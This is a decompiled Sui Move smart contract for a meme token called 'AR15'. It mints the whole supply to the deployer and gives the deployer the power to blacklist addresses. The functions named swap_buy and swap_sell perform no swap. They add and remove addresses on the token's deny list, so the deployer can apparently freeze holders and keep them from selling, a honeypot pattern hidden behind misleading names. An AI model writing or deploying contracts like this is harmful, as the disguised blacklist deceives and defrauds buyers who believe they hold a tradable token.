module 0x717bdaa43c25c8b3da3b8d36654e2343682b6fdcc330db72b69d593cfade0171::ar15 {
    struct AR15 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: AR15, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AR15>(arg0, 9, b"AR15", b"Justice For Pnut's AR15", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYvAS8e7PqTDkKHRbu9k6FkFKykdrsauDAmruqxGEFZvr"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<AR15>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AR15>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<AR15>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AR15>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AR15>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AR15>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AR15>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<AR15>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

